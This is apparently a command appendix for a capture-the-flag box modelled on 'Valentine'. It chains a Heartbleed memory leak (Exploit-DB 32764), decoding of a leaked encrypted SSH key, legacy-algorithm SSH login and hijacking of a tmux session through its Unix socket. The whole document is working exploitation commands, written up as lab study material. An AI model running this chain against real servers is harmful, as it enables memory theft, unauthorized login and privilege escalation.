# TLS Memory Disclosure and Tmux, Command Appendix

Commands used for the Valentine-style combination of Heartbleed memory
disclosure, encrypted SSH-key validation, and Unix-socket tmux session access.

## Heartbleed confirmation and capture

```bash
sudo nmap -Pn -n -p $SSLPort --script ssl-heartbleed \
  -oA $BoxDir/nmap/ssl-heartbleed $BoxIP
searchsploit -x 32764
searchsploit -m 32764
python2 $BoxDir/exploits/heartbleed-32764.py $BoxIP -p $SSLPort \
  > $BoxDir/loot/heartbleed-output.txt
grep -nE 'type = 24|length =|WARNING|Received heartbeat' \
  $BoxDir/loot/heartbleed-output.txt
strings -a -n 8 $BoxDir/loot/heartbleed-loop.txt | grep -v '^0x'
```

## Hex representation versus encrypted key

```bash
xxd -r -p $BoxDir/loot/hype_key $BoxDir/loot/hype_key.decoded
chmod 600 $BoxDir/loot/hype_key.decoded
file $BoxDir/loot/hype_key.decoded
ssh-keygen -y -f $BoxDir/loot/hype_key.decoded > /dev/null
```

## Legacy SSH and tmux socket access

```bash
ssh -i $BoxDir/loot/hype_key.decoded $Username@$BoxIP \
  -o 'HostKeyAlgorithms=+ssh-rsa' \
  -o 'PubkeyAcceptedAlgorithms=+ssh-rsa' \
  -o 'KexAlgorithms=+diffie-hellman-group1-sha1'

find / -type s -ls 2>/dev/null
ls -la $SocketDir
tmux -S $TmuxSocket ls
tmux -S $TmuxSocket attach-session -t 0
id
```

Keep passphrases, key contents, and proof values in private loot.

## External Resources

- [Exploit-DB 32764](https://www.exploit-db.com/exploits/32764)
- [CVE-2014-0160, MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160)
- [tmux manual](https://man7.org/linux/man-pages/man1/tmux.1.html)

